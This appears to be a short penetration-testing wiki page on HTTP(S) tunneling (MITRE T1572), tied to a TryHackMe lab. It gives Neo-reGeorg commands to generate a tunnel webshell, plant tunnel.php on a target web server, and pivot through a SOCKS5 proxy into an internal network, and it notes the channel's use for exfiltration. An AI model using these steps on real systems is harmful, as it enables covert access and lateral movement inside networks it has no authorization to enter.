---
description: MITRE ATT&CK™ Protocol Tunneling  - Technique T1572
---

# HTTP(s) Tunneling

## Theory

Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel. We can pivoting throught this.

{% hint style="danger" %}
We can also use HTTP(S) Tunneling as a good [exfiltration](../exfiltration/) channel.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Neo-reGeorg" %}
we will be using [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) to achieve tunneling. On our attacking machine we do:

```bash
v4resk@kali$ python3 neoreg.py generate -k 'P@ssw0rd!'
```

then, we have to upload generated files to the target machine and host then on a webserver. On the attacking machine we can do:

```bash
#Establish sock5 proxy
v4resk@kali$ python3 neoreg.py -k 'P@ssw0rd!' -u http://MACHINE_IP/uploader/files/tunnel.php

#We can now use it as sock5 proxy 
v4resk@kali$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/dataxexfilt" %}
